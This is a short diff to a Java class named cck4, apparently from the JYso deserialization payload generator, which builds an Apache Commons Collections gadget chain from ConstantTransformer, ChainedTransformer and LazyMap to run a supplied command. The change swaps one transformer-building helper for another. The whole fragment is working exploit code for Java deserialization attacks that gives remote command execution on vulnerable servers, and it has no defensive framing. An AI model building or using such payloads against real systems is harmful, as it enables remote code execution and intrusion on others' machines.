@@ -20,7 +20,7 @@ public class cck4 implements ObjectPayload<Object> {
 
     public Object getObject(String command) throws Exception {
         Transformer[] fakeTransformers = new Transformer[]{new ConstantTransformer(1)};
-        Transformer[] transformers = (Transformer[]) com.qi4l.JYso.gadgets.utils.Utils.makeTransformer(command);
+        Transformer[] transformers = com.qi4l.JYso.gadgets.utils.Utils.makeTransformer4(command);
         Transformer transformerChain = new ChainedTransformer(fakeTransformers);
         Map innerMap = new HashMap();
         Map outerMap = LazyMap.lazyMap(innerMap, transformerChain);
